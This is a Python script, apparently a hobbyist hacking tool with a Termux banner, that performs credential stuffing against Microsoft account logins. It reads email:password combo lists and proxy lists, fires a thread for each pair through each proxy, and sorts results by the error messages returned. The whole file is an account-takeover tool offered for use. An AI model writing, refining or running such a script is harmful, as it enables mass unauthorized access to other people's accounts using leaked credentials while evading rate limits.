import requests
import threading
import os
from colorama import Fore, Style
from tqdm import trange  # ensure tqdm is installed for progress bar

def login(email, password, use_proxy, proxy=None):
    try:
        session = requests.session()

        if use_proxy and proxy:
            session.proxies = {"http": proxy, "https": proxy}

        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36"
        }
        data = {
            "loginfmt": email,
            "passwd": password
        }
        response = session.post("https://login.live.com/", headers=headers, data=data, timeout=10)

        print(f"Attempted login for {email}:{password}")
        print(f"HTTP Status Code: {response.status_code}")
        print(f"Response Text: {response.text}")

        # Check for indicators of successful login
        if "Your account" in response.text and "Sign out" in response.text:
            print(f"{Fore.GREEN}[+] Login successful: {email}:{password}{Style.RESET_ALL}")
        else:
            # Check for specific failure indicators
            if "That Microsoft account doesn't exist" in response.text:
                print(f"{Fore.RED}[-] Login failed: {email}:{password} (Account does not exist){Style.RESET_ALL}")
            elif "That password is incorrect" in response.text:
                print(f"{Fore.RED}[-] Login failed: {email}:{password} (Incorrect password){Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Login failed: {email}:{password} (Unknown reason){Style.RESET_ALL}")

    except requests.RequestException as e:
        print(f"{Fore.RED}[-] Request Error: {e}{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

def main():
    try:
        use_proxy = input("Do you want to use proxies? (yes/no): ").strip().lower() == "yes"

        if use_proxy:
            proxy_file_path = "/data/data/com.termux/files/home/mcfa/proxy.txt"
            if not os.path.exists(proxy_file_path):
                print(f"{Fore.RED}Proxy file not found: {proxy_file_path}{Style.RESET_ALL}")
                return
            with open(proxy_file_path, "r") as f:
                proxies = [proxy.strip() for proxy in f.readlines() if proxy.strip()]
        else:
            proxies = [None]

        combo_file_path = "/data/data/com.termux/files/home/mcfa/combo.txt"
        if not os.path.exists(combo_file_path):
            print(f"{Fore.RED}Combo file not found: {combo_file_path}{Style.RESET_ALL}")
            return
        with open(combo_file_path, "r") as f:
            combos = f.readlines()

        threads = []
        for combo in combos:
            email, password = combo.strip().split(":")
            for proxy in proxies:
                thread = threading.Thread(target=login, args=(email, password, use_proxy, proxy))
                threads.append(thread)
                thread.start()

        for thread in threads:
            thread.join()

        print(f"{Fore.GREEN}[*] All login attempts completed.{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[-] Error in main: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    os.system('clear')

    # Printing color bars
    color_bars = [
        Fore.GREEN,
    ]
    for color in color_bars:
        for _ in trange(int(7**7.5), bar_format="{l_bar}%s{bar}%s{r_bar}" % (color, Style.RESET_ALL)):
            pass

    # Print your banner or information here
    print(f"{Fore.GREEN}\n.        :   :::  ::   .:  ::::::::::..   :::::::.      ...     :::\n")
    print(";;,.    ;;;  ;;; ,;;   ;;, ;;;;;;;;;;;   ;;;'';;'  .;;;;;;;.  ;;;\n")
    print("[[[[, ,[[[[, [[[,[[[,,,[[[ [[[ [[[,/[[['   [[[__[[\.,[[     \[[,[[[\n")
    print("$$$$$$$$\"$$$ $$$\"$$$\"\"\"$$$ $$$ $$$$$$c     $$\"\"\"\"y$$$$$,     $$$$$$")
    print("888 y88\" 888o888 888   \"88o888 888b \"88bo,_88o,,od8p\"888,_ _,88p888")
    print("mmm  m'  \"mmmmmm mmm    ymmmmm mmmm   \"w\" \"\"yummmp\"   \"ymmmmmp\" mmm\n")
    print("                       ©copyright by \033[93mmihir boi \033[97m\n")
    print(Style.RESET_ALL)

    print(" ")

    main()

